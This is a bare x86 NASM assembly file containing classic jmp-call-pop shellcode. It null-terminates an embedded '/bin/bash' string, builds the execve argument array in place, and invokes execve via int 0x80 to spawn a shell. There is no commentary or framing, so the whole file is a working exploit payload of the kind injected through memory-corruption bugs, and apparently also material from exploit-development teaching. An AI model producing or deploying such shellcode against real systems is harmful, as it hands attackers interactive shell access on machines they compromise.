global _start

section .text
_start:

	jmp short call_shellcode

shellcode:

	pop esi

	xor ebx, ebx
	mov byte [esi +9],bl
	mov dword [esi +10], esi
	mov dword [esi +14], ebx

	lea ebx, [esi]
	lea ecx, [esi +10]
	lea edx, [esi +14]

	xor eax, eax
	mov al, 0xb
	int 0x80

call_shellcode:

	call shellcode
	message db "/bin/bashABBBBCCCC"
